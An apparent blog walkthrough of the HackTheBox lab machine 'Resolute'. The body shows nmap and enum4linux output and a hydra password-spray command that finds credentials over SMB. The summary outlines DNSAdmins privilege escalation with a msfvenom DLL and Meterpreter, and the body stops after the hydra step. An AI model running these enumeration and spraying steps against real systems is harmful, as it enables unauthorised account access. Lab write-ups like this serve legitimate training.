<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="Quick Summary   → Resolute run as easy machine in the first phase as you easily find the users of the box and 1 password by sung enum4linux. I run hydra to bruteforce the users by 1 password and eas">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - Resolute">
<meta property="og:url" content="https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/index.html">
<meta property="og:site_name" content="PΛYΛƧ0">
<meta property="og:description" content="Quick Summary   → Resolute run as easy machine in the first phase as you easily find the users of the box and 1 password by sung enum4linux. I run hydra to bruteforce the users by 1 password and eas">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://ph-payas0.github.io/img/Resolute/htb-Resolute.png">
<meta property="og:image" content="https://www.hackthebox.eu/badge/image/128965">
<meta property="article:published_time" content="2020-05-28T18:26:29.000Z">
<meta property="article:modified_time" content="2020-06-01T00:25:57.469Z">
<meta property="article:author" content="medz">
<meta property="article:tag" content="windows">
<meta property="article:tag" content="retired">
<meta property="article:tag" content="smb">
<meta property="article:tag" content="dns">
<meta property="article:tag" content="dll">
<meta property="article:tag" content="metasploit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ph-payas0.github.io/img/Resolute/htb-Resolute.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon-1.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>HackTheBox - Resolute</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="PΛYΛƧ0" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/projects/">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/2020-05-03/HackTheBox-OpenAdmin/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&text=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&is_video=false&description=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox - Resolute&body=Check out this article: https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&title=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&name=HackTheBox - Resolute&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-05-29/HackTheBox-Resolute/&t=HackTheBox - Resolute" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum4linux"><span class="toc-number">4.1.</span> <span class="toc-text">Enum4linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Evil-WinRM"><span class="toc-number">5.1.</span> <span class="toc-text">Evil-WinRM</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Transfer-file-with-SAMBA"><span class="toc-number">6.1.</span> <span class="toc-text">Transfer file with SAMBA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hidden-directories"><span class="toc-number">6.2.</span> <span class="toc-text">Hidden directories</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Abusing-DNSAdmins-privilege-for-escalation-in-Active-Directory"><span class="toc-number">7.1.</span> <span class="toc-text">Abusing DNSAdmins privilege for escalation in Active Directory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-malicious-DLL"><span class="toc-number">7.2.</span> <span class="toc-text">Creating malicious DLL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setup-Impacket-smbserver"><span class="toc-number">7.3.</span> <span class="toc-text">Setup Impacket-smbserver</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Setup-Meterpreter-session"><span class="toc-number">7.4.</span> <span class="toc-text">Setup Meterpreter session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-root-txt"><span class="toc-number">7.5.</span> <span class="toc-text">Get the root.txt</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
        <div class="content index py4">
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        <div class="firefly"></div>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - Resolute
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">PΛYΛƧ0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2020-05-28T18:26:29.000Z" itemprop="datePublished">29-05-2020</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/HackTheBox/PenTesting/">PenTesting</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/dll/" rel="tag">dll</a>, <a class="tag-link" href="/tags/dns/" rel="tag">dns</a>, <a class="tag-link" href="/tags/metasploit/" rel="tag">metasploit</a>, <a class="tag-link" href="/tags/retired/" rel="tag">retired</a>, <a class="tag-link" href="/tags/smb/" rel="tag">smb</a>, <a class="tag-link" href="/tags/windows/" rel="tag">windows</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="/img/Resolute/htb-Resolute.png" alt="HackTheBox-OpenAdmin" title="RESOLUTE"></p>
<hr>
<h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → Resolute run as easy machine in the first phase as you easily find the <code>users</code> of the box and 1 <code>password</code> by sung <code>enum4linux</code>. I run <strong><code>hydra</code></strong> to bruteforce the <code>users</code> by 1 <code>password</code> and easily got <code>melanie</code>. I use the creds i get in <code>evil-winrm</code> and got the <code>user.txt</code>. The root part was gave me a little bit headache cause’ there was <code>Anti-Virus</code> inside the machine and I always disconnected when I run transfer a like <code>nc.exe</code> or <code>winPEAS.exe</code> for privilege escalation. As my enumeration there was another user <code>ryan</code> which his password is hidden in the directory. after I found it and switch from <code>melanie</code>. When doing enumeration i found that <code>ryan</code> is part of <strong><code>DNSAdmins</code></strong> that I can abuse it by adding malicious <code>DLL</code> in the <code>serverplugin</code>. Using <code>impacket-smbserver</code> i can load my <code>dll</code> file to machine. Restarting the <code>dns</code> service I will able to execute my <code>dll</code> as administrator.     </p>
<hr>
<hr>
<h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol>
<li><p><strong>Network Scanning</strong></p>
<p>→ Nmap scan</p>
<p>→ discover open ports and what services are running</p>
</li>
<li><p><strong>Enumeration</strong></p>
<p>→ run <code>enum4linux</code> gives some <code>usernames</code> and 1 <code>password</code> which can be use later</p>
</li>
<li><p><strong>Post - Exploitation</strong></p>
<p>→ with <code>Hydra</code> I brute force all the <code>usernames</code> with only 1 password and it use by <code>melanie</code></p>
<p>→ using <code>Evil-WinRM</code> to login as <code>melanie</code> and got the <code>user.txt</code></p>
</li>
<li><p><strong>Exploitation</strong></p>
<p>→ enumerating the file directory there was another user <code>ryan</code></p>
<p>→ using <code>ls -hidden</code> we see a file which contains juicy information</p>
<p>→ by reading the <code>.txt</code> file I got the password of <code>ryan</code></p>
</li>
<li><p><strong>Privilege Escalation</strong></p>
<p>→ create a malicious <code>dll</code> file with <code>msfvenom</code></p>
<p>→ load my <code>dll</code> file with <code>impacket-smbserver</code></p>
<p>→ running my meterpreter session</p>
<p>→ stop and start <code>dns</code> service</p>
<p>→ finally I got the administrator and <code>root.txt</code></p>
</li>
</ol>
<hr>
<h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ I always begin at <strong><em>NMAP</em></strong> to look on the services what is running. I always use</p>
<hr>
<ul>
<li>-sV      ⇒ Probe open ports to determine service/version info</li>
<li>-sC      ⇒ equivalent to —script=default</li>
<li>-A      ⇒ Agressive scan</li>
<li>-oN      ⇒ to save our scan results to a text file</li>
</ul>
<hr>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">nmap -sV -sC -A 10.10.10.169 -oN nmap-Resolute</span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Nmap 7.80 scan initiated Sun May 31 06:59:58 2020 as: nmap -sV -sC -A -oN nmap-Resolute 10.10.10.169</span><br><span class="line">WARNING: RST from 10.10.10.169 port 53 -- is this port really open?</span><br><span class="line">WARNING: RST from 10.10.10.169 port 53 -- is this port really open?</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.169</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 989 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">53/tcp   open  domain?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSVersionBindReqTCP: </span><br><span class="line">|     version</span><br><span class="line">|_    <span class="built_in">bind</span></span><br><span class="line">88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-30 23:11:35Z)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V=7.80%I=7%D=5/31%Time=5ED2E596%P=x86_64-pc-linux-gnu%r(DNSV</span><br><span class="line">SF:ersionBindReqTCP,20,<span class="string">"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span></span><br><span class="line"><span class="string">SF:x04bind\0\0\x10\0\x03"</span>);</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=5/31%OT=53%CT=1%CU=35791%PV=Y%DS=2%DC=T%G=Y%TM=5ED2E64</span><br><span class="line">OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=F9%GCD=4%ISR=109%TI=RD%CI=I%II=I%TS=8)SEQ</span><br><span class="line">OS:(SP=102%GCD=1%ISR=104%TI=I%CI=I%II=I%SS=O%TS=A)OPS(O1=%O2=%O3=M54DNW8NNT</span><br><span class="line">OS:11%O4=M54DNW8ST11%O5=M54DNW8ST11%O6=M54DST11)WIN(W1=0%W2=0%W3=2000%W4=20</span><br><span class="line">OS:00%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%</span><br><span class="line">OS:DF=Y%T=80%S=Z%A=S+%F=AR%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=</span><br><span class="line">OS:0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S</span><br><span class="line">OS:=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R</span><br><span class="line">OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=</span><br><span class="line">OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%</span><br><span class="line">OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)</span><br><span class="line"></span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 2h31m01s, deviation: 4h02m30s, median: 11m00s</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: Resolute</span><br><span class="line">|   NetBIOS computer name: RESOLUTE\x00</span><br><span class="line">|   Domain name: megabank.local</span><br><span class="line">|   Forest name: megabank.local</span><br><span class="line">|   FQDN: Resolute.megabank.local</span><br><span class="line">|_  System time: 2020-05-30T16:12:18-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: &lt;blank&gt;</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-05-30T23:12:22</span><br><span class="line">|_  start_date: 2020-05-30T22:15:46</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   210.01 ms 10.10.14.1</span><br><span class="line">2   217.91 ms 10.10.10.169</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"><span class="comment"># Nmap done at Sun May 31 07:03:34 2020 -- 1 IP address (1 host up) scanned in 216.34 seconds</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute took 2m8s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure>

<hr>
<p>We’ve got a lot of open ports. but the interesting is the :</p>
<p><code>445(smb)</code>, <code>53(dns)</code>, <code>88(kerberos)</code> and <code>5985(WinRM)</code>.</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="Enum4linux"><a href="#Enum4linux" class="headerlink" title="Enum4linux"></a>Enum4linux</h3><p>to enumerate some juicy information to box, i use <code>enum4linux</code> so let’s see :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">❯ enum4linux -o -U -G -S 10.10.10.169</span><br><span class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun May 31 08:06:03 2020</span><br><span class="line"></span><br><span class="line"> ========================== </span><br><span class="line">|    Target Information    |</span><br><span class="line"> ========================== </span><br><span class="line">Target ........... 10.10.10.169</span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... <span class="string">''</span></span><br><span class="line">Password ......... <span class="string">''</span></span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ==================================================== </span><br><span class="line">|    Enumerating Workgroup/Domain on 10.10.10.169    |</span><br><span class="line"> ====================================================</span><br></pre></td></tr></table></figure>

<p>As you can see here there’s a lot of users but only 1 password <code>Welcome123!</code> and it use to user <code>marko</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line"> ============================= </span><br><span class="line">|    Users on 10.10.10.169    |</span><br><span class="line"> ============================= </span><br><span class="line">Use of uninitialized value <span class="variable">$global_workgroup</span> <span class="keyword">in</span> concatenation (.) or string at ./enum4linux.pl line 866.</span><br><span class="line">index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbc RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account <span class="keyword">for</span> administering the computer/domain</span><br><span class="line">index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude       Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.</span><br><span class="line">index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred Name: (null)    Desc: (null)</span><br><span class="line">index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account <span class="keyword">for</span> guest access to the computer/domain</span><br><span class="line">index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo      Name: (null)    Desc: (null)</span><br><span class="line">index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account</span><br><span class="line">index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak       Desc: Account created. Password <span class="built_in">set</span> to Welcome123!</span><br><span class="line">index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie      Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10ba RID: 0x19d4 acb: 0x00000010 Account: paulo        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan  Name: Ryan Bertrand     Desc: (null)</span><br><span class="line">index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve        Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita       Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf  Name: (null)    Desc: (null)</span><br><span class="line">index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach Name: (null)    Desc: (null)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[1]+  Stopped                 enum4linux -o -U -G -S 10.10.10.169</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute took 2m4s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Evil-WinRM"><a href="#Evil-WinRM" class="headerlink" title="Evil-WinRM"></a>Evil-WinRM</h3><p>I login it with <code>evil-winrm</code> but it failed ! so, i decided to use <code>hydra</code> and save all the users and a text file bruteforce with only 1 password :</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">❯ hydra -t 1 -V -f -L users.txt -p <span class="string">"Welcome123!"</span> 10.10.10.169 smb</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please <span class="keyword">do</span> not use <span class="keyword">in</span> military or secret service organizations, or <span class="keyword">for</span> illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-31 08:09:55</span><br><span class="line">[DATA] max 1 task per 1 server, overall 1 task, 24 login tries (l:24/p:1), ~24 tries per task</span><br><span class="line">[DATA] attacking smb://10.10.10.169:445/</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"abigail"</span> - pass <span class="string">"Welcome123!"</span> - 1 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"angela"</span> - pass <span class="string">"Welcome123!"</span> - 2 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"annette"</span> - pass <span class="string">"Welcome123!"</span> - 3 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"annika"</span> - pass <span class="string">"Welcome123!"</span> - 4 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"claire"</span> - pass <span class="string">"Welcome123!"</span> - 5 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"claude"</span> - pass <span class="string">"Welcome123!"</span> - 6 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"felicia"</span> - pass <span class="string">"Welcome123!"</span> - 7 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"fred"</span> - pass <span class="string">"Welcome123!"</span> - 8 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"gustavo"</span> - pass <span class="string">"Welcome123!"</span> - 9 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"Guest"</span> - pass <span class="string">"Welcome123!"</span> - 10 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"marcus"</span> - pass <span class="string">"Welcome123!"</span> - 11 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"marko"</span> - pass <span class="string">"Welcome123!"</span> - 12 of 24 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 10.10.10.169 - login <span class="string">"melanie"</span> - pass <span class="string">"Welcome123!"</span> - 13 of 24 [child 0] (0/0)</span><br><span class="line">[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 10.10.10.169 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-31 08:10:04</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute took 8s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure>

<p>looks easy right ? The password is belong to user <code>melanie</code> now using <code>Evil-WinRM</code> i will try to login it again.</p>
